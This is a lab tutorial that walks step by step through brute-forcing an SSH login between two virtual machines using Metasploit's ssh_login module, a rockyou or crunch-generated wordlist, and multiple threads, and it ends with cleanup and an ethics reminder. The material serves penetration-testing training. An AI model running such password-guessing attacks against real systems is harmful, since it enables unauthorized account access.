### **Setup:**

1. **Environment Preparation:**
    
    - Have two virtual machines running Kali Linux or any Debian-based.
    - One machine will act as the **target** (running SSH service) and the other as the **attacker** (running Metasploit).
    - Ensure that both the machines are in the same network and are able to ping to each other.
1. **Ensure SSH is Enabled on the Target Machine:**
    
    - Start the SSH service on the target machine:
        
        ```bash
        sudo service ssh start
        ```
        
    - Confirm SSH is running:
        
        ```bash
        sudo netstat -tuln | grep 22
        ```
        
    - Note the target machine's IP address:
        
        ```bash
        ip a
        ```
        
3. **Install Necessary Tools:**
    
    - Ensure Metasploit is installed on the attacker machine:
        
        ```bash
        msfconsole
        ```

### **Steps to Perform Brute Force Attack:**

1. **Start Metasploit Framework:**
    
    - Launch Metasploit on the attacker machine:
        
        ```bash
        msfconsole
        ```
        
2. **Load the SSH Login Module:**
    
    - Use the Metasploit SSH login auxiliary module:
        
        ```bash
        use auxiliary/scanner/ssh/ssh_login
        ```
        
3. **Set Target Parameters:**
    
    - Set the target IP address:
        
        ```bash
        set RHOSTS <Target_IP>
        ```
        
    - Specify the username to attempt login:
        
        ```bash
        set USERNAME <username>
        ```
        
        _Replace `<username>` with the actual username you want to test._
4. **Specify the Wordlist for Passwords:**
    
    - Use a pre-existing password list or create one:
        
        ```bash
        set PASS_FILE /usr/share/wordlists/rockyou.txt
        ```
        
    - Ensure the `rockyou.txt` file is uncompressed:
        
        ```bash
        gunzip /usr/share/wordlists/rockyou.txt.gz
        ```
	* You can also use your own password list:
		
```bash
		crunch 4 4 0123456789 -o password.txt
```

1. **Set the Number of Threads:**
    
    - To speed up the process, set multiple threads:
        
        ```bash
        set THREADS 4
        ```
        
6. **Initiate the Attack:**
    
    - Start the brute force attack:
        
        ```bash
        run
        ```
        
    - Metasploit will iterate through the password list, trying to log in using the provided username.
7. **Analyze Results:**
    
    - If a correct password is found, it will be displayed in the output:
        
        ```
        [SUCCESS] <Target_IP>:22 - Success: '<username>:<password>'
        ```

### **Post-Attack Cleanup:**

1. **Stop the SSH Service on the Target (Optional):**
    
    ```bash
    sudo service ssh stop
    ```
    
2. **Document Findings:**
    
    - Note the cracked credentials and include them in your report.
3. **Ethical Responsibility:**
    
    - Avoid causing harm or retaining unauthorized access to systems. Inform relevant authorities or owners about the findings if itâ€™s a penetration test.
